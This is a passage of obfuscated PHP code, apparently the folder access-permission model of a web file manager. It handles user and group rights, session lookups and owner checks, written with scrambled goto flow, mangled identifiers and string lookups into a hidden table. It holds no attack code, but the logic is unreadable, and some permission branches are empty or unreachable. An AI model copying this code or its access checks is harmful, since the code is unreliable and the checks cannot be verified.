dü©ßÇò¶Î: } function echoImage($B¢ÿÍó˘ª , $D†‡Õ∂Èô∑) { goto aÒºäπó∫ó; aÒºäπó∫ó: $FÜéÏºÈé› =& $_SERVER[¯èãÄπµ]; if (!$B¢ÿÍó˘ª ) { return !1; } ob_get_clean(); goto eœÎºåºÉı; C±ÉõàùÇ¬: imageDestroy($this->im); return $fÆÃ™ßˆ√ƒ; goto CÊêõ“«„É; eœÎºåºÉı: $fÆÃ™ßˆ√ƒ = !1; switch ($this->echoType) { case $FÜéÏºÈé›[1854]: $fÆÃ™ßˆ√ƒ = imagePNG($B¢ÿÍó˘ª ); break; case $FÜéÏºÈé›[163]: $fÆÃ™ßˆ√ƒ = imagePNG($B¢ÿÍó˘ª , $D†‡Õ∂Èô∑); break; } imageDestroy($B¢ÿÍó˘ª ); goto C±ÉõàùÇ¬; CÊêõ“«„É: } } goto f¶ÀôÆô¯ã; bÚ€ùï‹ûå: define($_SERVER[¯èãÄπµ][223], 2); define($_SERVER[¯èãÄπµ][224], 3); define($_SERVER[¯èãÄπµ][225], 1); goto F¡À«ÌäΩâ; FäØëÔ£ä®: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\x72\143\145\137\141\x75\164\x68"; public function getAuth($E“µïôÚ™â) { goto aŸˆƒ¶ÇÎË; aŸˆƒ¶ÇÎË: $d”Ò°ÀΩŸÂ =& $_SERVER[¯èãÄπµ]; $BπäôªÃ∂ı = $d”Ò°ÀΩŸÂ[2233]; $dˆÜñÔÜ¡— = array($d”Ò°ÀΩŸÂ[365] => $E“µïôÚ™â); goto dÙ«ïñàº⁄; dÙ«ïñàº⁄: $d¥Ï™üÑÂè = $this->field($BπäôªÃ∂ı)->order($d”Ò°ÀΩŸÂ[363])->where($dˆÜñÔÜ¡—)->select(); $aÉÎÓ°÷ëÉ = array(); foreach ($d¥Ï™üÑÂè as $BÓÊÀãÌ”ë) { if (Model($d”Ò°ÀΩŸÂ[2234])->listData($BÓÊÀãÌ”ë[$d”Ò°ÀΩŸÂ[2215]])) { $aÉÎÓ°÷ëÉ[] = $BÓÊÀãÌ”ë; } } goto D¯∞ïÚ°µ£; D¯∞ïÚ°µ£: return $aÉÎÓ°÷ëÉ; goto fÆäÌﬁ¯äÜ; fÆäÌﬁ¯äÜ: } public function setAuth($aÆîó∆±‚Õ, $fÂä›≠Øû∆) { goto e°≈€’ú’±; e°≈€’ú’±: $dÔ¶–€Ù”Ë =& $_SERVER[¯èãÄπµ]; $E¨µÌñììÜ = Model($dÔ¶–€Ù”Ë[1112])->sourceInfo($aÆîó∆±‚Õ); if ($E¨µÌñììÜ[$dÔ¶–€Ù”Ë[367]] != SourceModel::TYPE_GROUP) { return !1; } goto e”èöó÷ıö; aÆå¬∏ë∞∂: $this->where(array($dÔ¶–€Ù”Ë[379] => $aÆîó∆±‚Õ))->delete(); $this->addAll($f«çó¯‰¬≠); return !0; goto d‘í«…ñıΩ; e”èöó÷ıö: $c¯•à»ƒ„’ = 1; $Fñ‘ãŸ‚è„ = $E¨µÌñììÜ[$dÔ¶–€Ù”Ë[452]]; if ($Fñ‘ãŸ‚è„ != $c¯•à»ƒ„’) { $dç»£∆ÒøÛ = array($dÔ¶–€Ù”Ë[2087] => $Fñ‘ãŸ‚è„); $bãûÙ®πÎÜ = Model($dÔ¶–€Ù”Ë[2161])->field($dÔ¶–€Ù”Ë[1424])->where($dç»£∆ÒøÛ)->select(); $bãûÙ®πÎÜ = array_to_keyvalue($bãûÙ®πÎÜ, $dÔ¶–€Ù”Ë[33], $dÔ¶–€Ù”Ë[1424]); } goto eçÌ∑‘ŸÉœ; eçÌ∑‘ŸÉœ: $b´√ßÆîÚ– = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $f«çó¯‰¬≠ = array(); foreach ($fÂä›≠Øû∆ as $F¬âøúú⁄) { if (!in_array($F¬âøúú⁄[$dÔ¶–€Ù”Ë[367]], $b´√ßÆîÚ–)) { show_json(LNG($dÔ¶–€Ù”Ë[2235]), !1); } if ($Fñ‘ãŸ‚è„ != $c¯•à»ƒ„’) { if ($F¬âøúú⁄[$dÔ¶–€Ù”Ë[367]] == SourceModel::TYPE_GROUP) { } if ($F¬âøúú⁄[$dÔ¶–€Ù”Ë[452]] != 0 && !in_array($F¬âøúú⁄[$dÔ¶–€Ù”Ë[452]], $bãûÙ®πÎÜ)) { } } if ($F¬âøúú⁄[$dÔ¶–€Ù”Ë[452]] == 0) { $F¬âøúú⁄[$dÔ¶–€Ù”Ë[367]] = SourceModel::TYPE_USER; } $f«çó¯‰¬≠[] = array($dÔ¶–€Ù”Ë[365] => $aÆîó∆±‚Õ, $dÔ¶–€Ù”Ë[367] => intval($F¬âøúú⁄[$dÔ¶–€Ù”Ë[367]]), $dÔ¶–€Ù”Ë[452] => intval($F¬âøúú⁄[$dÔ¶–€Ù”Ë[452]]), $dÔ¶–€Ù”Ë[2215] => intval($F¬âøúú⁄[$dÔ¶–€Ù”Ë[2215]]) ? intval($F¬âøúú⁄[$dÔ¶–€Ù”Ë[2215]]) : 0, $dÔ¶–€Ù”Ë[2216] => intval($F¬âøúú⁄[$dÔ¶–€Ù”Ë[2216]]) ? intval($F¬âøúú⁄[$dÔ¶–€Ù”Ë[2216]]) : -1); } goto aÆå¬∏ë∞∂; d‘í«…ñıΩ: } public function authClear($Aç†∏å·Ø÷) { $Fáê±Ïò€ =& $_SERVER[¯èãÄπµ]; $dá•…‡”ƒ” = Model($Fáê±Ïò€[1112])->sourceInfo($Aç†∏å·Ø÷); $B£«Œ£˘Ùå = array($Aç†∏å·Ø÷); if ($dá•…‡”ƒ”[$Fáê±Ïò€[366]] == $Fáê±Ïò€[83]) { $bëÙØÏ•Ωõ = array($Fáê±Ïò€[521] => array($Fáê±Ïò€[479], $dá•…‡”ƒ”[$Fáê±Ïò€[455]] . $Aç†∏å·Ø÷ . $Fáê±Ïò€[480])); $B£«Œ£˘Ùå = Model($Fáê±Ïò€[1112])->field($Fáê±Ïò€[379])->where($bëÙØÏ•Ωõ)->getField($Fáê±Ïò€[365], !0); $B£«Œ£˘Ùå[] = $Aç†∏å·Ø÷; } $this->where(array($Fáê±Ïò€[379] => array($Fáê±Ïò€[380], $B£«Œ£˘Ùå)))->delete(); return !0; } public function get($bóÂÛñëäﬁ) { $d€¢ÎÂ±ÑÛ = $this->getSourceList(array($bóÂÛñëäﬁ), !0); return $d€¢ÎÂ±ÑÛ[0]; } public function getSourceList($f„ÏÈ—≠ïÃ, $cÖàäæ±›† = false) { goto C£îûÏ™‡ü; aÑÇî±áﬁá: $Aó≠úù¢À‘ = array($E„‹¶ÎïÑç[379] => array($E„‹¶ÎïÑç[380], $EèôÜ´«¬Â)); $Aç€ë≠ë®π = $this->field($fò‡ûÜÈ•‹)->where($Aó≠úù¢À‘)->select(); $Aç€ë≠ë®π = array_to_keyvalue_group($Aç€ë≠ë®π, $E„‹¶ÎïÑç[365]); goto FËãÇ≤·Çÿ; C£îûÏ™‡ü: $E„‹¶ÎïÑç =& $_SERVER[¯èãÄπµ]; if (!$f„ÏÈ—≠ïÃ) { return array(); } $EÏÊÖÑâÔ  = Model($E„‹¶ÎïÑç[1112]); goto Bã‚Àî°—“; Bã‚Àî°—“: if (!$cÖàäæ±›†) { $Aó≠úù¢À‘ = array($E„‹¶ÎïÑç[379] => array($E„‹¶ÎïÑç[380], $f„ÏÈ—≠ïÃ)); $cÖàäæ±›† = $EÏÊÖÑâÔ ->field($E„‹¶ÎïÑç[2236])->where($Aó≠úù¢À‘)->select(); $cÖàäæ±›† = array_to_keyvalue($cÖàäæ±›†, $E„‹¶ÎïÑç[365]); } $EèôÜ´«¬Â = $f„ÏÈ—≠ïÃ; foreach ($cÖàäæ±›† as $EªÉÖåÉ€Õ => $aà¢Ó≠Â«£) { $d®û”óÍ‘Œ = $EÏÊÖÑâÔ ->parentLevelArray($aà¢Ó≠Â«£[$E„‹¶ÎïÑç[455]]); $EèôÜ´«¬Â = array_merge($EèôÜ´«¬Â, $d®û”óÍ‘Œ, array($EªÉÖåÉ€Õ)); } goto cÉÈπæèäç; cÉÈπæèäç: $EèôÜ´«¬Â = array_values(array_unique($EèôÜ´«¬Â)); if (!$EèôÜ´«¬Â) { return array(); } $fò‡ûÜÈ•‹ = $E„‹¶ÎïÑç[2237]; goto aÑÇî±áﬁá; FËãÇ≤·Çÿ: $BÁ◊ù¯äå⁄ = array(); foreach ($cÖàäæ±›† as $eÓö‘º¨ÂÂ => $CöΩà˜ñØª) { $BÁ◊ù¯äå⁄[$eÓö‘º¨ÂÂ] = $this->makeSourceAuth($CöΩà˜ñØª, $Aç€ë≠ë®π); } return $BÁ◊ù¯äå⁄; goto F®àÜÊàˆÁ; F®àÜÊàˆÁ: } public function authDeepCheck($DÚÙ•ÔÑ∑ä, $Få°ê¡Ï†Ã = false) { $Däêé›˜øÁ =& $_SERVER[¯èãÄπµ]; if (_get($GLOBALS, $Däêé›˜øÁ[453])) { return !1; } $fàƒéíÍ∑ = $this->makeAuthDeep(); if (!in_array($DÚÙ•ÔÑ∑ä, $fàƒéíÍ∑)) { return !1; } return array($Däêé›˜øÁ[373] => -1, $Däêé›˜øÁ[414] => array($Däêé›˜øÁ[381] => $Däêé›˜øÁ[1033], $Däêé›˜øÁ[2093] => $Däêé›˜øÁ[464], $Däêé›˜øÁ[382] => LNG($Däêé›˜øÁ[2238]), $Däêé›˜øÁ[2105] => $Däêé›˜øÁ[2239]), $Däêé›˜øÁ[2240] => array($Däêé›˜øÁ[384] => $Däêé›˜øÁ[2241], $Däêé›˜øÁ[75] => $DÚÙ•ÔÑ∑ä)); } protected function makeAuthDeep() { goto EªπáÑÒ¶ò; bß˘‚æ†åÇ: $dÖ¶ò‚¥Æá = Model($B´π∏–ÙàÙ[2242])->listData(); $cá≥ˆÏÒëÖ = array(); foreach ($dÖ¶ò‚¥Æá as $Aè◊∂ÀÖÈ¡) { if ($Aè◊∂ÀÖÈ¡[$B´π∏–ÙàÙ[372]] == 0 && $Aè◊∂ÀÖÈ¡[$B´π∏–ÙàÙ[2107]] == $B´π∏–ÙàÙ[83]) { $cá≥ˆÏÒëÖ[] = $Aè◊∂ÀÖÈ¡[$B´π∏–ÙàÙ[363]]; } } goto F‰¶êÜ¨›ä; cÑÂºúäıå: $Büø§¿”‹ò = array_values(array_unique($Büø§¿”‹ò)); foreach ($Büø§¿”‹ò as $FÎîëç◊áë) { $DŒ‚ﬁˆ∫Æ = $eõÂ°üÑÒå->getInfo($FÎîëç◊áë); $aããäÜë∫Ï[] = $DŒ‚ﬁˆ∫Æ[$B´π∏–ÙàÙ[387]][$B´π∏–ÙàÙ[365]]; } $aããäÜë∫Ï = array_values(array_unique($aããäÜë∫Ï)); goto A“üﬂíêÎ; F¥ƒíÒ¡πœ: $FÕ€‰º≥ç = array_to_keyvalue($eØ “êÈ≈â, $B´π∏–ÙàÙ[33], $B´π∏–ÙàÙ[365]); $aããäÜë∫Ï = array(); $Büø§¿”‹ò = $fﬁ±Ôû™ûå; goto Eã±—÷·ÃÜ; b≈˘ûÙÑäÍ: if ($fﬁ±Ôû™ûå) { $dí≥ö†¥Çè = array(array($B´π∏–ÙàÙ[367] => SourceModel::TYPE_USER, $B´π∏–ÙàÙ[452] => USER_ID), array($B´π∏–ÙàÙ[367] => SourceModel::TYPE_GROUP, $B´π∏–ÙàÙ[452] => array($B´π∏–ÙàÙ[380], $fﬁ±Ôû™ûå)), $B´π∏–ÙàÙ[918] => $B´π∏–ÙàÙ[2167]); } if ($cá≥ˆÏÒëÖ) { $dí≥ö†¥Çè = array($dí≥ö†¥Çè, $B´π∏–ÙàÙ[2215] => array($B´π∏–ÙàÙ[2243], $cá≥ˆÏÒëÖ)); } $eØ “êÈ≈â = $this->field($B´π∏–ÙàÙ[2244])->where($dí≥ö†¥Çè)->select(); goto F¥ƒíÒ¡πœ; A“üﬂíêÎ: return $aããäÜë∫Ï; goto a’Ç≤µºªΩ; Eã±—÷·ÃÜ: $Föª⁄çÑπü = Model($B´π∏–ÙàÙ[1112]); $eõÂ°üÑÒå = Model($B´π∏–ÙàÙ[454]); if ($FÕ€‰º≥ç) { $eãÔ”„ß∞Ò = $Föª⁄çÑπü->where(array($B´π∏–ÙàÙ[365] => array($B´π∏–ÙàÙ[380], $FÕ€‰º≥ç)))->select(); foreach ($eãÔ”„ß∞Ò as $Fà©Úº≠Ôß) { $F√ö—å⁄ïå = $Föª⁄çÑπü->parentLevelArray($Fà©Úº≠Ôß[$B´π∏–ÙàÙ[455]]); $aããäÜë∫Ï = array_merge($aããäÜë∫Ï, $F√ö—å⁄ïå); $Büø§¿”‹ò[] = $Fà©Úº≠Ôß[$B´π∏–ÙàÙ[452]]; } } goto d‚„§ŸËã–; d‚„§ŸËã–: $Büø§¿”‹ò = array_values(array_unique($Büø§¿”‹ò)); $AÑ¢º≥…–» = $Büø§¿”‹ò; foreach ($AÑ¢º≥…–» as $FÎîëç◊áë) { $DŒ‚ﬁˆ∫Æ = $eõÂ°üÑÒå->getInfo($FÎîëç◊áë); $F√ö—å⁄ïå = $Föª⁄çÑπü->parentLevelArray($DŒ‚ﬁˆ∫Æ[$B´π∏–ÙàÙ[455]]); $Büø§¿”‹ò = array_merge($Büø§¿”‹ò, $F√ö—å⁄ïå); } goto cÑÂºúäıå; EªπáÑÒ¶ò: $B´π∏–ÙàÙ =& $_SERVER[¯èãÄπµ]; static $aããäÜë∫Ï = false; if ($aããäÜë∫Ï) { return $aããäÜë∫Ï; } goto bß˘‚æ†åÇ; F‰¶êÜ¨›ä: $fﬁ±Ôû™ûå = Session::get($B´π∏–ÙàÙ[2199]); $fﬁ±Ôû™ûå = array_to_keyvalue($fﬁ±Ôû™ûå, $B´π∏–ÙàÙ[33], $B´π∏–ÙàÙ[2087]); $dí≥ö†¥Çè = array($B´π∏–ÙàÙ[367] => SourceModel::TYPE_USER, $B´π∏–ÙàÙ[452] => USER_ID); goto b≈˘ûÙÑäÍ; a’Ç≤µºªΩ: } private function makeSourceAuth($e´ßŒ∂å™⁄, $BƒôÓΩÖœ–) { goto aæ…ÕÆêï—; aæ…ÕÆêï—: $Dﬁ∆°”–öÜ =& $_SERVER[¯èãÄπµ]; $Aúﬁ“õ≥ëÁ = Session::get($Dﬁ∆°”–öÜ[2199]); $Aúﬁ“õ≥ëÁ = array_to_keyvalue($Aúﬁ“õ≥ëÁ, $Dﬁ∆°”–öÜ[2087]); goto EµÈñÙœ©Ÿ; EµÈñÙœ©Ÿ: $d√«È≥æ÷Ü = $Dﬁ∆°”–öÜ[83]; $b®°„Ø•Ü— = Model($Dﬁ∆°”–öÜ[1112])->parentLevelArray($e´ßŒ∂å™⁄[$Dﬁ∆°”–öÜ[455]]); $b®°„Ø•Ü— = array_merge(array($e´ßŒ∂å™⁄[$Dﬁ∆°”–öÜ[365]]), array_reverse($b®°„Ø•Ü—)); goto Fçπáµçï’; dıùµÉ‹ÃŸ: if (!$døﬂ‰£¥ìè && $e´ßŒ∂å™⁄[$Dﬁ∆°”–öÜ[367]] == SourceModel::TYPE_GROUP) { $C∫é®’Ô≈¥ = Model($Dﬁ∆°”–öÜ[454])->getInfo($e´ßŒ∂å™⁄[$Dﬁ∆°”–öÜ[452]]); $C∆˘‰éúÕŒ = explode($Dﬁ∆°”–öÜ[47], trim($bãÊ“·Õ›û[$Dﬁ∆°”–öÜ[455]], $Dﬁ∆°”–öÜ[47])); foreach ($C∆˘‰éúÕŒ as $BÍô…∏Æé) { if ($BÍô…∏Æé == $Dﬁ∆°”–öÜ[464] || $BÍô…∏Æé == $d√«È≥æ÷Ü) { continue; } if (!isset($Aúﬁ“õ≥ëÁ[$BÍô…∏Æé])) { continue; } $Aˆñ–åËà = $Aúﬁ“õ≥ëÁ[$BÍô…∏Æé]; $døﬂ‰£¥ìè = array($Dﬁ∆°”–öÜ[2245] => intval($Aˆñ–åËà[$Dﬁ∆°”–öÜ[372]][$Dﬁ∆°”–öÜ[372]]), $Dﬁ∆°”–öÜ[2246] => $Aˆñ–åËà[$Dﬁ∆°”–öÜ[372]], $Dﬁ∆°”–öÜ[2240] => array($Dﬁ∆°”–öÜ[384] => $Dﬁ∆°”–öÜ[2249], $Dﬁ∆°”–öÜ[2250] => $C∫é®’Ô≈¥[$Dﬁ∆°”–öÜ[387]][$Dﬁ∆°”–öÜ[365]], $Dﬁ∆°”–öÜ[2248] => $C∫é®’Ô≈¥[$Dﬁ∆°”–öÜ[459]])); break; } } if ((!$døﬂ‰£¥ìè || $døﬂ‰£¥ìè[$Dﬁ∆°”–öÜ[373]] <= 0) && $e´ßŒ∂å™⁄[$Dﬁ∆°”–öÜ[367]] == SourceModel::TYPE_GROUP) { $cÜ¯ ∏é·∂ = $this->authDeepCheck($e´ßŒ∂å™⁄[$Dﬁ∆°”–öÜ[365]], $døﬂ‰£¥ìè); if ($cÜ¯ ∏é·∂) { $døﬂ‰£¥ìè = $cÜ¯ ∏é·∂; } } return $døﬂ‰£¥ìè; goto Céï Ë≠π≥; Fçπáµçï’: $døﬂ‰£¥ìè = !1; foreach ($b®°„Ø•Ü— as $e˘‰œûß‰Ñ) { if (!isset($BƒôÓΩÖœ–[$e˘‰œûß‰Ñ])) { continue; } $F·úá¡ñê˜ = $this->authMake($BƒôÓΩÖœ–[$e˘‰œûß‰Ñ]); if ($F·úá¡ñê˜[$Dﬁ∆°”–öÜ[414]]) { $døﬂ‰£¥ìè = $F·úá¡ñê˜; break; } } if (!$døﬂ‰£¥ìè && $e´ßŒ∂å™⁄[$Dﬁ∆°”–öÜ[367]] == SourceModel::TYPE_GROUP) { $BÍô…∏Æé = $e´ßŒ∂å™⁄[$Dﬁ∆°”–öÜ[452]]; if (isset($Aúﬁ“õ≥ëÁ[$BÍô…∏Æé])) { $Aˆñ–åËà = $Aúﬁ“õ≥ëÁ[$BÍô…∏Æé]; $C∫é®’Ô≈¥ = Model($Dﬁ∆°”–öÜ[454])->getInfo($BÍô…∏Æé); $døﬂ‰£¥ìè = array($Dﬁ∆°”–öÜ[2245] => intval($Aˆñ–åËà[$Dﬁ∆°”–öÜ[372]][$Dﬁ∆°”–öÜ[372]]), $Dﬁ∆°”–öÜ[2246] => $Aˆñ–åËà[$Dﬁ∆°”–öÜ[372]], $Dﬁ∆°”–öÜ[2240] => array($Dﬁ∆°”–öÜ[384] => $Dﬁ∆°”–öÜ[2247], $Dﬁ∆°”–öÜ[75] => $C∫é®’Ô≈¥[$Dﬁ∆°”–öÜ[387]][$Dﬁ∆°”–öÜ[365]], $Dﬁ∆°”–öÜ[2248] => $C∫é®’Ô≈¥[$Dﬁ∆°”–öÜ[459]])); } } goto dıùµÉ‹ÃŸ; Céï Ë≠π≥: } public function authOwnerApply($cà¬Üµˆ‰à) { goto F¯ï¯Òö·ã; FÉœâ€üû‹: $Bõè çÁúÖ = array(); $aê„œööÈº = array(); foreach ($B’˘ÚËæ∑ì as $BÃ¥™ôƒ≈ç => $A÷´§–„¯È) { $E≤áß¢ÍÜä = $this->authFolderOwnerUser($A÷´§–„¯È); $Bõè çÁúÖ[$BÃ¥™ôƒ≈ç] = $E≤áß¢ÍÜä; $aê„œööÈº = array_merge($aê„œööÈº, $E≤áß¢ÍÜä[$d÷¿∫⁄»®œ[531]]); if ($E≤áß¢ÍÜä[$d÷¿∫⁄»®œ[2252]]) { break; } } goto eıÃöÂÿïı; eıÃöÂÿïı: if (count($aê„œööÈº) == 0) { $aê„œööÈº = $this->authFolderOwnerGroup($cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[452]]); } $aê„œööÈº = array_unique($aê„œööÈº); if (AuthModel::authCheckRoot($cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[372]][$d÷¿∫⁄»®œ[373]])) { $aê„œööÈº[] = USER_ID; } goto dçÊ™…¥’ù; dçÊ™…¥’ù: $cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[372]][$d÷¿∫⁄»®œ[2253]] = Model($d÷¿∫⁄»®œ[470])->userListInfo($aê„œööÈº); return $cà¬Üµˆ‰à; goto eÆ§∂ü≈–â; eç±Êì¨ïﬁ: $Béﬂäá◊çî = Model($d÷¿∫⁄»®œ[1112])->parentLevelArray($cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[455]]); $Béﬂäá◊çî = array_merge(array($cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[365]]), array_reverse($Béﬂäá◊çî)); $dêæ˘»âä¬ = $d÷¿∫⁄»®œ[2237]; goto B›ó∞Ö√•í; F¯ï¯Òö·ã: $d÷¿∫⁄»®œ =& $_SERVER[¯èãÄπµ]; if (empty($cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[372]]) || isset($cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[2251]]) && $cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[2251]]) { return $cà¬Üµˆ‰à; } if (AuthModel::authCheckRoot($cà¬Üµˆ‰à[$d÷¿∫⁄»®œ[372]][$d÷¿∫⁄»®œ[373]])) { return $cà¬Üµˆ‰à; } goto eç±Êì¨ïﬁ; B›ó∞Ö√•í: $f¿Ÿ¬®Ωæ› = array($d÷¿∫⁄»®œ[379] => array($d÷¿∫⁄»®œ[380], $Béﬂäá◊çî)); $B’˘ÚËæ∑ì = $this->field($dêæ˘»âä¬)->where($f¿Ÿ¬®Ωæ›)->select(); $B’˘ÚËæ∑ì = array_to_keyvalue_group($B’˘ÚËæ∑ì, $d÷¿∫⁄»®œ[365]); goto FÉœâ€üû‹; eÆ§∂ü≈–â: } private function authFolderOwnerGroup($aÒ‰´™•÷À) { $eñÊ¡…µ‘¬ =& $_SERVER[¯èãÄπµ]; $c◊‘æëèû¡ = Model($eñÊ¡…µ‘¬[2161])->where(array($eñÊ¡…µ‘¬[2087] => $aÒ‰´™•÷À))->select(); $c®Èﬁ–∆∂“ = array(); if (!$c◊‘æëèû¡) { return $c®Èﬁ–∆∂“; } foreach ($c◊‘æëèû¡ as $E≥ŸΩïÜ∏∫) { $dˆ◊ÕÖ∫ﬁÉ = $this->authInfo($E≥ŸΩïÜ∏∫); if (AuthModel::authCheckRoot($dˆ◊ÕÖ∫ﬁÉ[$eñÊ¡…µ‘¬[372]])) { $c®Èﬁ–∆∂“[] = $E≥ŸΩïÜ∏∫[$eñÊ¡…µ‘¬[1424]]; } } return $c®Èﬁ–∆∂“; } private function authFolderOwnerUser($b¥‡Ø®„Íƒ) { $e‰‘ú∂É„¿ =& $_SERVER[¯èãÄπµ]; $F‡ﬁ·âê¨ﬁ = array(); $d«”†√¿»œ = !1; foreach ($b¥‡Ø®„Íƒ as $B·±∂©›ºÈ) { $C•–ë∑èÉË = $this->authInfo($B·±∂©›ºÈ); if ($B·±∂©›ºÈ[$e‰‘ú∂É„¿[452]] == $e‰‘ú∂É„¿[464]) { $d«”†√¿»œ = !0; } if ($B·±∂©›ºÈ[$e‰‘ú∂É„¿[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($C•–ë∑èÉË[$e‰‘ú∂É„¿[372]])) { $F‡ﬁ·âê¨ﬁ[] = $B·±∂©›ºÈ[$e‰‘ú∂É„¿[452]]; } } } return array($e‰‘ú∂É„¿[531] => $F‡ﬁ·âê¨ﬁ, $e‰‘ú∂É„¿[2252] => $d«”†√¿»œ); } public function authMake($bÆªìÖ’Èè) { goto bè—∆éÿ»Ó; E´Ã˜›∂Ç—: $Fç¢îÕæêä = $d≤É‘¨ÇÔÛ ? $E“Úä≠î‡Ê : ($fØ÷ìòìä± ? $F†®ëÈ¢√˜ : $bäˆÏÚ∂°æ); $F’Î¬±±∏á = $d≤É‘¨ÇÔÛ ? $d∏ﬁ∂õŸßå : ($fØ÷ìòìä± ? $b¨¶‡ï≤πﬁ : $B©ŒÔ∆Ó¢Ö); $AúÍ‹ƒÿê¨ = $d≤É‘¨ÇÔÛ ? $fòä¶Ç∏êä[2254] : ($fØ÷ìòìä± ? $fòä¶Ç∏êä[2255] : ($cß™ƒò™î• ? $fòä¶Ç∏êä[2256] : $fòä¶Ç∏êä[357])); goto E¶Ç¢Ì¶õß; C∂€±©§Ù•: $bäˆÏÚ∂°æ = 0; $d∏ﬁ∂õŸßå = 0; $b¨¶‡ï≤πﬁ = 0; goto Cç…“ﬁ†ÓË; eÆÑÓÁ∂’ø: $c•µÃû©€ﬁ = array_to_keyvalue($eÑôÃû€Æœ, $fòä¶Ç∏êä[33], $fòä¶Ç∏êä[2087]); $E“Úä≠î‡Ê = 0; $F†®ëÈ¢√˜ = 0; goto C∂€±©§Ù•; B°®à≤ÊèÌ: $cß™ƒò™î• = 0; $CúúëÓƒÒ¯ = array($fòä¶Ç∏êä[365] => 0); foreach ($bÆªìÖ’Èè as $CúúëÓƒÒ¯) { $F’Î¬±±∏á = $this->authInfo($CúúëÓƒÒ¯); $AÓºû∫«ÍÇ = $CúúëÓƒÒ¯[$fòä¶Ç∏êä[452]]; $B≠¡∑âòµ’ = intval($F’Î¬±±∏á[$fòä¶Ç∏êä[372]]); if ($CúúëÓƒÒ¯[$fòä¶Ç∏êä[367]] == SourceModel::TYPE_USER && $AÓºû∫«ÍÇ == USER_ID) { $d≤É‘¨ÇÔÛ = !0; $d∏ﬁ∂õŸßå = $F’Î¬±±∏á; $E“Úä≠î‡Ê = $B≠¡∑âòµ’; } else { if ($CúúëÓƒÒ¯[$fòä¶Ç∏êä[367]] == SourceModel::TYPE_GROUP && in_array($AÓºû∫«ÍÇ, $c•µÃû©€ﬁ)) { $fØ÷ìòìä± = !0; if ($B≠¡∑âòµ’ >= $F†®ëÈ¢√˜) { $F†®ëÈ¢√˜ = $B≠¡∑âòµ’; $b¨¶‡ï≤πﬁ = $F’Î¬±±∏á; } } else { if ($AÓºû∫«ÍÇ == $fòä¶Ç∏êä[464]) { $cß™ƒò™î• = !0; $B©ŒÔ∆Ó¢Ö = $F’Î¬±±∏á; $bäˆÏÚ∂°æ = $B≠¡∑âòµ’; } } } } goto E´Ã˜›∂Ç—; Cç…“ﬁ†ÓË: $B©ŒÔ∆Ó¢Ö = 0; $d≤É‘¨ÇÔÛ = 0; $fØ÷ìòìä± = 0; goto B°®à≤ÊèÌ; E¶Ç¢Ì¶õß: $AÜÛÓØ€∂á = array($fòä¶Ç∏êä[2245] => intval($Fç¢îÕæêä), $fòä¶Ç∏êä[2246] => $F’Î¬±±∏á, $fòä¶Ç∏êä[2240] => array($fòä¶Ç∏êä[384] => $AúÍ‹ƒÿê¨, $fòä¶Ç∏êä[75] => $CúúëÓƒÒ¯[$fòä¶Ç∏êä[365]])); return $AÜÛÓØ€∂á; goto dúÛÑ˘æ‘≈; bè—∆éÿ»Ó: $fòä¶Ç∏êä =& $_SERVER[¯èãÄπµ]; if (!$bÆªìÖ’Èè) { return array($fòä¶Ç∏êä[373] => 0, $fòä¶Ç∏êä[414] => !1); } $eÑôÃû€Æœ = Session::get($fòä¶Ç∏êä[2199]); goto eÆÑÓÁ∂’ø; dúÛÑ˘æ‘≈: } public function authTargetInfoMake($C¶ä«Œèú¿) { goto C†•ƒÕüöÂ; B≠Öüà≈È: foreach ($C¶ä«Œèú¿ as $eèŸÖ»π¨‹) { if ($eèŸÖ»π¨‹[$a€ï∫òïÕã[367]] == SourceModel::TYPE_USER) { $b‘ŒŒÃ€∆∫[] = intval($eèŸÖ»π¨‹[$a€ï∫òïÕã[452]]); } else { if ($eèŸÖ»π¨‹[$a€ï∫òïÕã[367]] == SourceModel::TYPE_GROUP) { $AÑ”µÆ⁄„[] = intval($eèŸÖ»π¨‹[$a€ï∫òïÕã[452]]); } } } if ($b‘ŒŒÃ€∆∫) { $b‘ŒŒÃ€∆∫ = Model($a€ï∫òïÕã[470])->userListInfo($b‘ŒŒÃ€∆∫); } if ($AÑ”µÆ⁄„) { $AÇÿ¡àüµ⁄ = array($a€ï∫òïÕã[2159] => array($a€ï∫òïÕã[380], $AÑ”µÆ⁄„)); $AÑ”µÆ⁄„ = Model($a€ï∫òïÕã[454])->field($a€ï∫òïÕã[2172])->where($AÇÿ¡àüµ⁄)->select(); $AÑ”µÆ⁄„ = array_to_keyvalue($AÑ”µÆ⁄„, $a€ï∫òïÕã[2087]); } goto cÜ≠≈±ç∂ı; C†•ƒÕüöÂ: $a€ï∫òïÕã =& $_SERVER[¯èãÄπµ]; $b‘ŒŒÃ€∆∫ = array(); $AÑ”µÆ⁄„ = array(); goto B≠Öüà≈È; cÜ≠≈±ç∂ı: return array($a€ï∫òïÕã[2257] => $b‘ŒŒÃ€∆∫, $a€ï∫òïÕã[2248] => $AÑ”µÆ⁄„); goto c¢®±ºÛ‡¶; c¢®±ºÛ‡¶: } private function authInfo($C«âıµ©óÆ) { $c◊∆ı◊íÉà =& $_SERVER[¯èãÄπµ]; if ($C«âıµ©óÆ[$c◊∆ı◊íÉà[2215]]) { $DÀà√‡Œˆ› = Model($c◊∆ı◊íÉà[2234])->listData($C«âıµ©óÆ[$c◊∆ı◊íÉà[2215]]); if (!$DÀà√‡Œˆ›) { return !1; $c≥ùÏ¨˘πë = Model($c◊∆ı◊íÉà[2234])->listData(); $AñÜˆ™“èç = array_filter_by_field($c≥ùÏ¨˘πë, $c◊∆ı◊íÉà[372], $c◊∆ı◊íÉà[464]); return $AñÜˆ™“èç; } $Dñƒ©åêïå = array_field_key($DÀà√‡Œˆ›, array($c◊∆ı◊íÉà[363], $c◊∆ı◊íÉà[28], $c◊∆ı◊íÉà[372], $c◊∆ı◊íÉà[2105], $c◊∆ı◊íÉà[2108])); $Dñƒ©åêïå[$c◊∆ı◊íÉà[2258]] = $C«âıµ©óÆ; return $Dñƒ©åêïå; } else { return array($c◊∆ı◊íÉà[381] => 0, 